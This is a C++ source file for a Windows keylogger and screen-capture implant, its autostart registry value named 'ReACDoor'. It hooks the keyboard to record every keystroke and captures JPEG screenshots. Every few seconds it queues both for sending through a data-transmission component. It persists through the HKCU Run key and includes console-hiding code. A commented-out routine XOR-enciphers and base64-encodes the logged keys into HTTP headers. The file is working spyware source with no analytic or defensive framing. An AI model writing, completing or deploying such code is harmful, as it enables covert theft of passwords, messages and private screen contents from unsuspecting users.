#include <iostream>
#include "lodepng.h"
#include "base64.h"
#include "HTTPRequest.hpp"
#include <windows.h>
#include <thread>
#include "datatransmission.h"
#include <mutex>
#include "cipher.h"
#include <jpeglib.h>



int jpegCompressionValue = 50;
enum messageTypes{keystrokes = 0, screenshot} mType;


struct RawKeyEvent
{
    DWORD vkCode;
    DWORD scanCode;
    bool  isExtended;
    bool  shift;
    bool  ctrl;
    bool  alt;
    bool  capsLock;
};


HHOOK hHook = NULL;
//bool capsLock = false;

std::string recordedKeystrokes = "";
std::string capturedScreenshot = "";


std::mutex capturedScreenshotMutex;
std::mutex recordedKeystrokesMutex;


std::mutex rawKeystrokesQueueMutex;
std::vector<RawKeyEvent> rawKeystrokesQueue;





std::string convertUnsignedCharVectorToString(std::vector<unsigned char> vector)
{
    std::string s = "";

    for(auto &uc : vector)
    {
        s += (char)uc;
    }
    return s;
}

std::vector<unsigned char> convertStringToUnsignedCharVector(std::string s)
{
    std::vector<unsigned char> vector;

    for(auto &c : s)
    {
        vector.emplace_back((unsigned char)c);
    }

    return vector;
}



void saveToCapturedScreenshot(std::string screenshot)
{
    std::unique_lock<std::mutex> lock(capturedScreenshotMutex);
    capturedScreenshot = screenshot;
}

std::string getCapturedScreenshot()
{
    std::unique_lock<std::mutex> lock(capturedScreenshotMutex);
    return capturedScreenshot;
}


void saveToRecordedKeystrokes(std::string value)
{
    std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
    recordedKeystrokes += value;
}



std::string getRecordedKeystrokes()
{
    std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
    return recordedKeystrokes;
}

void clearRecordedKeystrokes()
{
    std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
    recordedKeystrokes = "";
}





inline void enqueueRawKey(const RawKeyEvent& ev) {
    std::unique_lock<std::mutex> lock(rawKeystrokesQueueMutex);
    rawKeystrokesQueue.push_back(ev);
}

std::vector<RawKeyEvent> drainRawKeystrokesQueue() {
    std::vector<RawKeyEvent> out;
    std::unique_lock<std::mutex> lock(rawKeystrokesQueueMutex);
    out.swap(rawKeystrokesQueue);
    return out;
}


void processRawKey(const RawKeyEvent& ev) {
    if (ev.vkCode == VK_BACK) {
        saveToRecordedKeystrokes("[Backspace]");
        return;
    }
    if (ev.vkCode == VK_RETURN) {
        saveToRecordedKeystrokes("[Return]");
        return;
    }

    BYTE lpKeyState[256] = { 0 };

    if (ev.shift)    lpKeyState[VK_SHIFT]   = 0x80;
    if (ev.ctrl)     lpKeyState[VK_CONTROL] = 0x80;
    if (ev.alt)      lpKeyState[VK_MENU]    = 0x80;
    if (ev.capsLock) lpKeyState[VK_CAPITAL] = 0x01;

    if (ev.vkCode == VK_SHIFT)   lpKeyState[VK_SHIFT]   |= 0x80;
    if (ev.vkCode == VK_CONTROL) lpKeyState[VK_CONTROL] |= 0x80;
    if (ev.vkCode == VK_MENU)    lpKeyState[VK_MENU]    |= 0x80;

    wchar_t wbuffer[64] = { 0 };

    int result = ToUnicodeEx(
        ev.vkCode, ev.scanCode, lpKeyState,
        wbuffer, (int)(sizeof(wbuffer) / sizeof(wbuffer[0])),
        ev.isExtended ? 1 : 0,
        GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));

    if (result > 0) {
        char buffer[64] = { 0 };
        WideCharToMultiByte(CP_UTF8, 0, wbuffer, result,
                            buffer, sizeof(buffer) / sizeof(char), NULL, NULL);
        saveToRecordedKeystrokes(buffer);
    }
}








/*void sendGetRequest(std::string url)
{
    try
    {
        // you can pass http::InternetProtocol::V6 to Request to make an IPv6 request
        http::Request request{url};
        const std::vector<unsigned char> body{};

        std::vector<std::pair<std::string, std::string>> headers;

        headers.emplace_back(std::pair<std::string,std::string>("imageBase64Encoded","blablub"));
        headers.emplace_back(std::pair<std::string,std::string>("recordedKeystrokes",base64_encode(Cipher::XOR(getRecordedKeystrokes(),"ohlongjohnson"))));

        // send a get request
        const auto response = request.send("GET",body,headers);

        std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
    }
    catch (const std::exception& e)
    {
        std::cerr << "Request failed, error: " << e.what() << '\n';
    }

}*/


std::vector<unsigned char> getScreenshot()
{
    int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    /*std::cout << x << std::endl;
    std::cout << y << std::endl;
    std::cout << cx << std::endl;
    std::cout << cy << std::endl;*/

    std::vector<unsigned char> jpg;


    HDC dcScreen = GetDC(NULL);
    HDC dcTarget = CreateCompatibleDC(dcScreen);


    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = cx;
    bi.bmiHeader.biHeight = -cy;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;


    void* pixels = nullptr;

    HBITMAP bmpTarget = CreateDIBSection(dcScreen, &bi, DIB_RGB_COLORS, &pixels, NULL, 0);


    if (!bmpTarget)
    {
        DeleteDC(dcTarget);
        ReleaseDC(NULL, dcScreen);
        return{};
    }


    HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);

    BitBlt(dcTarget,0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);


    //BGRA to RGBA
    std::vector<unsigned char> rgba(cx * cy * 4);

    unsigned char* src =
        static_cast<unsigned char*>(pixels);

    for (int i = 0; i < cx * cy; ++i)
    {
        rgba[i * 4 + 0] = src[i * 4 + 2]; // R
        rgba[i * 4 + 1] = src[i * 4 + 1]; // G
        rgba[i * 4 + 2] = src[i * 4 + 0]; // B
        rgba[i * 4 + 3] = 255;             // A
    }


    //unsigned error = lodepng::encode(png, rgba, cx, cy, LCT_RGBA, 8);


    // JPEG encoding
    jpeg_compress_struct cinfo{};
    jpeg_error_mgr jerr{};

    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);

    unsigned char* output = nullptr;
    unsigned long outputSize = 0;

    jpeg_mem_dest(&cinfo, &output, &outputSize);

    cinfo.image_width = cx;
    cinfo.image_height = cy;
    cinfo.input_components = 3;
    cinfo.in_color_space = JCS_RGB;

    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, jpegCompressionValue, TRUE);

    jpeg_start_compress(&cinfo, TRUE);

    std::vector<unsigned char> row(cx * 3);

    while (cinfo.next_scanline < cinfo.image_height)
    {
        int y = cinfo.next_scanline;

        for (int i = 0; i < cx; ++i)
        {
            row[i * 3 + 0] = rgba[(y * cx + i) * 4 + 0];
            row[i * 3 + 1] = rgba[(y * cx + i) * 4 + 1];
            row[i * 3 + 2] = rgba[(y * cx + i) * 4 + 2];
        }

        JSAMPROW rowPtr = row.data();
        jpeg_write_scanlines(&cinfo, &rowPtr, 1);
    }

    jpeg_finish_compress(&cinfo);

    jpg.assign(output, output + outputSize);

    free(output);
    jpeg_destroy_compress(&cinfo);


    SelectObject(dcTarget, oldBmp);
    DeleteDC(dcTarget);
    ReleaseDC(NULL,dcScreen);
    DeleteObject(bmpTarget);

    return jpg;
}




void deliveryThread(DataTransmission &dt,int interval_seconds)
{
    interval_seconds *= 1000;
    for(;;)
    {
        Sleep(interval_seconds);


        // Process everything the hook has queued up
        const std::vector<RawKeyEvent> keyEvents = drainRawKeystrokesQueue();
        for (const RawKeyEvent& keyEvent : keyEvents)
        {

            processRawKey(keyEvent);
        }

        mType = keystrokes;

        const std::string s = getRecordedKeystrokes();
        if(s != "")
        {
            dt.Enqueue(mType,s);
            clearRecordedKeystrokes();
        }


        mType = screenshot;


        saveToCapturedScreenshot(convertUnsignedCharVectorToString(getScreenshot()));
        dt.Enqueue(mType,getCapturedScreenshot());


    }

}




LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam)
{
    if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;

        RawKeyEvent ev;
        ev.vkCode     = kbd->vkCode;
        ev.scanCode   = kbd->scanCode;
        ev.isExtended = (kbd->flags & LLKHF_EXTENDED) != 0;

        ev.shift    = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
        ev.ctrl     = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        ev.alt      = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;
        ev.capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;

        enqueueRawKey(ev);
    }
    return CallNextHookEx(hHook, code, wParam, lParam);
}

void hideConsoleWindow()
{
    HWND hwnd = GetConsoleWindow();
    //SetForegroundWindow(hwnd);
    //hwnd = GetForegroundWindow();
    ShowWindow(hwnd,SW_HIDE);
}

void showConsoleWindow()
{
    HWND hwnd = GetConsoleWindow();
    //SetForegroundWindow(hwnd);
    //hwnd = GetForegroundWindow();
    ShowWindow(hwnd,SW_SHOW);
}

void addToAutostart()
{

    HKEY hkey = NULL;
    LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    DWORD pathSize=255;
    char executablePath[pathSize];

    //Gets the path of the executable file
    GetModuleFileNameA(NULL,executablePath,pathSize);
    LSTATUS lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_WRITE, &hkey);

    if(lResult == ERROR_SUCCESS)
    {
        RegSetValueEx(hkey,(LPCSTR)"ReACDoor",0,REG_SZ,(const unsigned char*)executablePath,strlen(executablePath));
        RegCloseKey(hkey);
    }

}





int main()
{
    //sets dpi process awareness to prevent the getsystemmetrics functions from returning false values
    SetProcessDPIAware();
    //SetConsoleOutputCP(CP_UTF8);
    //hideConsoleWindow();

    addToAutostart();

    /*std::string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
    lodepng::save_file(convertStringToUnsignedCharVector(base64_decode(screenB64)),"test.png");*/





    //capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;




    DataTransmission dt = DataTransmission();

    std::thread delivery(deliveryThread,std::ref(dt),3);

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
    if (hHook == NULL)
    {
        //std::cerr << "Keyboard hook failed!" << std::endl;
        return 1;
    }
    while (GetMessage(NULL, NULL, 0, 0));



    return 0;
}
